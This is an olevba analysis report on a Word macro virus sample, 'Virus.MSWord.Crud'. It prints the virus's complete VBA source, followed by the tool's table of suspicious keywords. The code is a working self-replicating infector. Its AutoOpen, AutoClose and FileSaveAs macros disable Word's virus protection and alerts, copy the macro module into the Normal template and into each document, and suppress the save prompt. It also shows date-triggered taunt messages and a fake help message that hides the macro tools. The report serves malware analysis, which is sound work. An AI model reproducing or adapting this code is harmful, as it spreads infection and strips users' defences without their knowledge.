olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Crud
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Crud - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Crud.bas 
in file: ./Virus.MSWord.Crud - OLE stream: 'Macros/VBA/Crud'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo EifelCrud

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Crud" Then
            DocumentInstalled = True
        End If
   Next
  
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Crud" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Crud", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crud", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

EifelCrud:

End Sub

Sub AutoClose()
On Error GoTo EifelCrud

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Crud" Then
            DocumentInstalled = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Crud" Then
            GlobalInstalled = True
        End If
    Next
    
     If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Crud", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crud", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

EifelCrud:
Call Crapper
End Sub

Sub Crapper()
On Error GoTo EifelCrud

If Month(Now()) = 6 And Day(Now()) = 27 Then
        
   With Assistant.NewBalloon
    .BalloonType = msoBalloonTypeBullets
    .Icon = msoIconTip
    .Button = msoButtonSetOkCancel
    .Heading = "Talon 1997."
    .Text = "Your Infected With The Eifel Crud"
    .Button = msoButtonSetOK
    .Show
End With
    With Assistant.NewBalloon
    .BalloonType = msoBalloonTypeBullets
    .Icon = msoIconTip
    .Button = msoButtonSetOkCancel
    .Heading = "Talon 1997"
    .Text = "Talon's First Word 97 Macro Virus"
    .Button = msoButtonSetOK
    .Show
End With
    With Assistant.NewBalloon
    .BalloonType = msoBalloonTypeBullets
    .Icon = msoIconTip
    .Button = msoButtonSetOkCancel
    .Heading = "Talon 1997"
    .Text = "Thanks To Pyro For Blazing the Trail"
    .Button = msoButtonSetOK
    .Show
End With
   
   End If

Application.DisplayAlerts = wdAlertsAll

EifelCrud:

End Sub

Sub FileSaveAs()
'
' FileSaveAs Macro
' Saves a copy of the document in a separate file
'
    Dialogs(wdDialogFileSaveAs).Show

On Error GoTo EifelCrud

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Crud" Then
            DocumentInstalled = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Crud" Then
            GlobalInstalled = True
        End If
    Next
    
     If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Crud", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crud", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
    End If

    Application.DisplayAlerts = wdAlertsAll

EifelCrud:

End Sub
Sub ToolsMacro()
On Error GoTo EifelCrud
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "Help !!"
 .Text = "That option is not intalled, please intall the HELP files to continue"
 .Button = msoButtonSetOK
 .Show
End With

EifelCrud:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

